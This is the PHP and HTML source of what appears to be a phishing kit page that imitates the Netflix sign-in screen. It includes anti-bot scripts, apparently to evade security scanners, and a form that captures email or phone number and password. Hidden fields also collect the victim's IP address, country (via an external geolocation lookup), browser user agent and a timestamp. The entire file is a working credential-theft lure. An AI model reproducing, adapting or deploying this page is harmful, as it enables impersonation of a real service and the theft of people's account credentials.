<?php
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include("includes/next.inc.php");
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/app.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
<div class="app">
	<div class="bg_login">
		<img class="concord-img vlv-creative" srcset="img/bg-login 340w, img/bg-login-medium.jpg 1010w, img/bg-login-large.jpg 1610w"   sizes="(max-width: 320px) 340px,
            (max-width: 480px) 1010px,
            1540px" src="img/bg-login.jpg" alt="">
	</div>
	<div class="bg_opacity"></div>
	<div class="header_login">
		<a href="#" class="svg-nfLogo">
			<svg viewBox="0 0 111 30" class="svg-icon" focusable="true">
				<title></title>
				<g id="nfx-logo">
					<path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path>
				</g>
			</svg>
			<span class="screen-reader-text">Netflix</span>
		</a>
	</div>
	<div>
		<div class="login_content">
			<div class="login_form_main">
			<div class="login_form_ctt">
				<h1>Sign In</h1>
			<div class="login_form">
				<div class="form__group">
					<input type="text" name="email" id="email" class="form__field" placeholder="Email or phone number">
					<label for="email" class="form__label">Email or phone number</label>
				</div>
				<span class="err0rmail">Please enter a valid email or phone number.</span>
				<div class="form__group">
					<input type="password" id="pass" name="password" class="form__field" placeholder="Password">
					<label for="email" class="form__label">Password</label>
					<span class="show-password">SHOW</span>
				    <span class="hide-password">HIDE</span>
				</div>
				<span class="err0rpass">Your password must contain between 4 and 60 characters.</span>
				<input type="hidden" id="ip" name="ip">
				<input type="hidden" id="countryip" name="countryip">
				<input type="hidden" name="useragent" id="usragent" value="<?php echo $_SERVER['HTTP_USER_AGENT']; ?>">
				<input type="hidden" name="timeop" id="timeop" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
				<script>
				  function ipLookUp () {
				  $.ajax('http://ip-api.com/json')
				  .then(
				      function success(response) {
				          $('#ip').val(response.query);
				          $('#countryip').val(response.country);
				      },
				      function fail(data, status) {
				          console.log('Request failed.  Returned status of',
				                      status);
				      }
				  );
				}
				ipLookUp()
				</script>
				<button type="submit" name="submit" class="btn_login">Sign In</button>

			</div>
			</div>
				<div class="form_rememberme">
					<label class="container"><span id="rmbrme_span">Remember me</span>
						<input type="checkbox" checked="checked">
						<span class="checkmark"></span>
					</label>
					<span id="login-help-link">Need help?</span>
				</div>
			</div>
			<div class="login_form_end">
				<div class="fb_login_img">
					<img src="img/FB-logo.png">
				</div>
				<div class="fb_login_span">
					<span>Login with Facebook</span>
				</div>
				<div class="sign_up">
					<span>New to Netflix?</span><a href="#">Sign up now</a>
				</div>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="container_footer"> 
			<div class="Q_us"><a>Questions? Contact us.</a></div>
			<a class="link_footer" href="#">Gift Card Terms</a>
			<a class="link_footer" href="#">Terms of Use</a>
			<a class="link_footer" href="#">Privacy Statement</a>
			<div class="select_arrow">
					<img src="img/glob.png">
				<select class="ui_select" tabindex="0" placeholder="lang-switcher">
					<option data-language="ar" data-country="#">العربية</option>
					<option value="" data-language="fr" data-country="#">Français</option>
					<option selected="" value="" data-language="en" data-country="#">English</option>
				</select>
			</div>
		</div>
	</div>
</div>
</body>
</html>